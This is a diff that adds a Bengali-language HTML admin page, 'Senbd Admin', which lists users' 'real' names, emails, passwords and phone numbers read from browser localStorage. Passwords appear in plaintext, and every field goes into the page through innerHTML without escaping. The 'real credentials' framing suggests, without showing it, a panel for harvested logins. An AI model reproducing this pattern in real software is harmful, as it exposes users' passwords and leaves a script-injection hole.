@@ -1,0 +1,78 @@
+<!DOCTYPE html><html lang="bn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Senbd Admin</title><link rel="stylesheet" href="style.css"></head><body>
+
+    <!-- সাইডবার (স্ক্রিনশটের মতো) -->
+    <aside class="sidebar">
+        <div class="brand-section">
+            <span class="brand-name">SENBD</span>
+            <span class="live-badge">LIVE</span>
+        </div>
+
+        <nav class="nav-menu">
+            <a href="#" class="nav-item active">
+                <i>📊</i> <span class="nav-text">ড্যাশবোর্ড</span>
+            </a>
+            <a href="#" class="nav-item">
+                <i>👥</i> <span class="nav-text">ইউজার লিস্ট</span>
+            </a>
+        </nav>
+
+        <div class="logout-section">
+            <a href="index.html" class="nav-item" style="margin: 0; padding: 10px 0;">
+                <i>🚪</i> <span class="logout-text">লগ আউট</span>
+            </a>
+        </div>
+    </aside>
+
+    <!-- মূল কন্টেন্ট এরিয়া -->
+    <main class="main-content">
+        <div class="header">
+            <h1>ইউজার ম্যানেজমেন্ট</h1>
+        </div>
+
+        <div class="data-card">
+            <table>
+                <thead>
+                    <tr>
+                        <th>আসল নাম</th>
+                        <th>আসল ইমেইল</th>
+                        <th>আসল পাসওয়ার্ড</th>
+                        <th>আসল ফোন নাম্বার</th>
+                    </tr>
+                </thead>
+                <tbody id="user-display-table">
+                    <!-- এখানে ইউজার অ্যাপ থেকে আসা ডাটা দেখাবে -->
+                </tbody>
+            </table>
+        </div>
+    </main>
+
+    <script>
+        // ইউজার অ্যাপ (LocalStorage) থেকে ডাটা লোড করা
+        function fetchUserData() {
+            const users = JSON.parse(localStorage.getItem('senbd_users')) || [];
+            const tableBody = document.getElementById('user-display-table');
+            tableBody.innerHTML = '';
+
+            if (users.length === 0) {
+                tableBody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#888;">কোনো ইউজার তথ্য পাওয়া যায়নি</td></tr>';
+                return;
+            }
+
+            users.reverse().forEach(user => {
+                const row = `
+                    <tr>
+                        <td>${user.name || 'N/A'}</td>
+                        <td>${user.email}</td>
+                        <td>${user.pass}</td>
+                        <td style="color: #fff; font-weight: bold;">${user.phone || 'N/A'}</td>
+                    </tr>
+                `;
+                tableBody.innerHTML += row;
+            });
+        }
+
+        // পেজ লোড হলে ডাটা দেখাবে
+        window.onload = fetchUserData;
+    </script>
+
+<script src="script.js"></script></body></html>
